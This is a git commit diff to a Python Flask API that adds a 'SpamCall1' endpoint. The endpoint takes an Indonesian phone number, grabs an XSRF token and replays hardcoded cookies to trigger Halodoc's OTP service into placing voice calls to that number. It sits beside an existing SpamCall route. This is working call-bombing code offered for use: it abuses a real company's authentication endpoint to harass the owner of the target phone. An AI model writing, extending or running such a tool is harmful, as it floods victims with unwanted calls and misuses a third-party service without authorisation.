da54cbebccbf237e9d6945fb83f0424e81515ff3
AmmarXploit <104218064+AmmarrBN@users.noreply.github.com>
2023-11-08 07:00:08 +0700

    Update app.py

--- app.py
+++ app.py
@@ -40,6 +40,32 @@ class SpamCall(Resource):
 				"creator":"AmmarBN"
 			})
 
+class SpamCall1(Resource):
+	def post(self):
+		nomor=request.args.get("nomor")
+		if not nomor:
+			return ({
+				"message": "nomor tidak valid (8xxxx)",
+				"response code": 404
+			})
+		xsrf = requests.get("https://magneto.api.halodoc.com/api/v1/users/status").cookies.get_dict()
+		headhaldoc = {"referer": "https://www.halodoc.com","content-type": "application/json","x-xsrf-token": xsrf['XSRF-TOKEN']}
+		paylodhaldoc = {"phone_number": "+62"+nomor,"channel": "voice"}
+		cokihaldoc = {"cookie": '_gcl_au=1.1.935637007.1686465186; _gid=GA1.2.1888372629.1686465187; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7={"g":"9ade8176-03c1-dd87-f8d7-c0c3f60f861a","c":1686465187381,"l":1686465187381}; XSRF-TOKEN='+xsrf['XSRF-TOKEN']+'; afUserId=31b1ff72-9c27-4492-a787-7a895c0d422e-p; AF_SYNC=1686465191318; _ga_02NBJNEKVH=GS1.1.1686465187.1.1.1686465223.0.0.0; amp_394863=WECZG4ZhC4dZKUWVGE4Ogh...1h2kii76k.1h2kiiai8.3.0.3; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7={"g":"c13c57ed-4fbf-80d3-7b17-19eb5a8fcedc","e":1686467027367,"c":1686465187365,"l":1686465227367}; _ga=GA1.2.1084460534.1686465187'}
+		response = requests.post("https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests",headers=headhaldoc,data=json.dumps(paylodhaldoc),cookies=cokihaldoc).json()
+		if 'otp_id' in response:
+			return ({
+				"response":"success",
+				"message":f"Berhasil Mengirim Call Ke {nomor}",
+				"creator":"AmmarBN"
+			})
+		else:
+			return ({
+				"response":"Failed",
+				"message":f"Gagal Mengirim Call ke {nomor}",
+				"creator":"AmmarBN"
+			})
+
 class HomePage(Resource):
     def get(self):
         return jsonify({"mssg":"Halo Admin, Rest Flask Berhasil dibuat ©Dusttale"})
@@ -63,5 +89,6 @@ api.add_resource(HomePage, "/apikey", methods=["GET"])
 api.add_resource(RandomUa, "/api/user-agent", methods=["GET"])
 api.add_resource(Kontol, "/testing", methods=["GET"])
 api.add_resource(SpamCall, "/api/call", methods=["POST"])
+api.add_resource(SpamCall1, "/api/call-tools", methods=["POST"])
 if __name__ == "__main__":
     app.run(debug=True)
